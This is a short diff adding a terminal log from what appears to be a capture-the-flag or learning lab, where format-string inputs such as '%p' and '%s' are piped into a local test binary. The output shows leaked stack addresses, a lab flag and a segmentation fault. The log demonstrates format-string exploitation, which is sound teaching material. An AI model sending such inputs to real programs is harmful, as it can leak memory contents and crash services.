@@ -1,0 +1,11 @@
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && echo %p %p %p | ./format
+Say something:
+0x5ae4907c8004 0x5ae4907c8004 0xa70252070252070
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && echo A%sB | ./format
+Say something:
+Aflag{format_string_leaks}B
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && echo %s %s %s %s | ./format
+bash: 第 1 行：  1067 已完成               echo %s %s %s %s
+      1068 段错误               （核心已转储） | ./format
